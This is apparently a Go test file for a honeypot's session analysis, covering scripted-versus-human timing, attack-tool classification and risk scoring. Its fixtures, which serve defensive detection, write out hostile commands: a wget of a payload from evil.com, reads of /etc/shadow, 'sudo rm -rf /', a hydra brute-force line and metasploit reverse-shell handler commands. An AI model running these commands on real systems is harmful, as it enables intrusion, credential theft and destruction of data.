package analysis

import (
	"testing"
	"time"

	"github.com/aiagentmackenzie-lang/HONEYTRAP/internal/models"
)

func TestIsScripted_UniformIntervals(t *testing.T) {
	base := time.Now()
	events := []models.Event{
		{ID: "1", OccurredAt: base},
		{ID: "2", OccurredAt: base.Add(2 * time.Second)},
		{ID: "3", OccurredAt: base.Add(4 * time.Second)},
		{ID: "4", OccurredAt: base.Add(6 * time.Second)},
		{ID: "5", OccurredAt: base.Add(8 * time.Second)},
	}
	if !IsScripted(events) {
		t.Error("Uniform intervals should be detected as scripted")
	}
}

func TestIsScripted_VariableIntervals(t *testing.T) {
	base := time.Now()
	events := []models.Event{
		{ID: "1", OccurredAt: base},
		{ID: "2", OccurredAt: base.Add(1 * time.Second)},
		{ID: "3", OccurredAt: base.Add(15 * time.Second)},
		{ID: "4", OccurredAt: base.Add(17 * time.Second)},
		{ID: "5", OccurredAt: base.Add(45 * time.Second)},
	}
	if IsScripted(events) {
		t.Error("Variable intervals should not be detected as scripted")
	}
}

func TestIsHuman_VariableTiming(t *testing.T) {
	base := time.Now()
	events := []models.Event{
		{ID: "1", OccurredAt: base},
		{ID: "2", OccurredAt: base.Add(2 * time.Second)},
		{ID: "3", OccurredAt: base.Add(30 * time.Second)},
		{ID: "4", OccurredAt: base.Add(32 * time.Second)},
		{ID: "5", OccurredAt: base.Add(90 * time.Second)},
	}
	if !IsHuman(events) {
		t.Error("Variable timing with pauses should be detected as human")
	}
}

func TestClassifyTool_Nmap(t *testing.T) {
	events := []models.Event{
		{ID: "1", Type: "command", Payload: map[string]any{"data": "nmap -sV -p- 192.168.1.0/24"}},
		{ID: "2", Type: "command", Payload: map[string]any{"data": "nmap -O target"}},
	}
	tool := ClassifyTool(events)
	if tool != "nmap" {
		t.Errorf("Expected nmap, got %s", tool)
	}
}

func TestClassifyTool_Metasploit(t *testing.T) {
	events := []models.Event{
		{ID: "1", Type: "command", Payload: map[string]any{"data": "use exploit/multi/handler"}},
		{ID: "2", Type: "command", Payload: map[string]any{"data": "set payload windows/meterpreter/reverse_tcp"}},
		{ID: "3", Type: "command", Payload: map[string]any{"data": "sessions -l"}},
	}
	tool := ClassifyTool(events)
	if tool != "metasploit" {
		t.Errorf("Expected metasploit, got %s", tool)
	}
}

func TestClassifyTool_Unknown(t *testing.T) {
	events := []models.Event{
		{ID: "1", Type: "command", Payload: map[string]any{"data": "ls -la"}},
		{ID: "2", Type: "command", Payload: map[string]any{"data": "cat /etc/hosts"}},
	}
	tool := ClassifyTool(events)
	if tool != "custom" {
		t.Errorf("Expected custom, got %s", tool)
	}
}

func TestRiskScore_High(t *testing.T) {
	base := time.Now()
	session := models.Session{
		ID:        "s-1",
		StartedAt: base,
		EndedAt:   nil,
	}
	events := []models.Event{
		{ID: "1", SessionID: "s-1", Type: "login", OccurredAt: base, Payload: map[string]any{"data": "root"}},
		{ID: "2", SessionID: "s-1", Type: "command", OccurredAt: base.Add(1 * time.Second), Payload: map[string]any{"data": "nmap -sV 10.0.0.0/8"}},
		{ID: "3", SessionID: "s-1", Type: "command", OccurredAt: base.Add(2 * time.Second), Payload: map[string]any{"data": "cat /etc/shadow"}},
		{ID: "4", SessionID: "s-1", Type: "command", OccurredAt: base.Add(3 * time.Second), Payload: map[string]any{"data": "sudo su -"}},
		{ID: "5", SessionID: "s-1", Type: "command", OccurredAt: base.Add(4 * time.Second), Payload: map[string]any{"data": "wget http://evil.com/payload.sh"}},
	}
	score := RiskScore(session, events)
	if score < 0.5 {
		t.Errorf("Expected high risk score, got %.2f", score)
	}
}

func TestRiskScore_Low(t *testing.T) {
	base := time.Now()
	session := models.Session{
		ID:        "s-2",
		StartedAt: base,
		EndedAt:   nil,
	}
	events := []models.Event{
		{ID: "1", SessionID: "s-2", Type: "connect", OccurredAt: base, Payload: map[string]any{"data": "connected"}},
	}
	score := RiskScore(session, events)
	if score > 0.5 {
		t.Errorf("Expected low risk score for minimal activity, got %.2f", score)
	}
}

func TestRiskScore_Bounded(t *testing.T) {
	base := time.Now()
	session := models.Session{
		ID:        "s-3",
		StartedAt: base,
		EndedAt:   nil,
	}
	// Create many events to push score high
	events := make([]models.Event, 100)
	for i := range events {
		events[i] = models.Event{
			ID:         string(rune(i)),
			SessionID:  "s-3",
			Type:       "command",
			OccurredAt: base.Add(time.Duration(i) * time.Second),
			Payload:    map[string]any{"data": "nmap -sV; cat /etc/shadow; sudo rm -rf /; wget evil; hydra -l root"},
		}
	}
	score := RiskScore(session, events)
	if score > 1.0 {
		t.Errorf("Risk score should not exceed 1.0, got %.2f", score)
	}
	if score < 0 {
		t.Errorf("Risk score should not be negative, got %.2f", score)
	}
}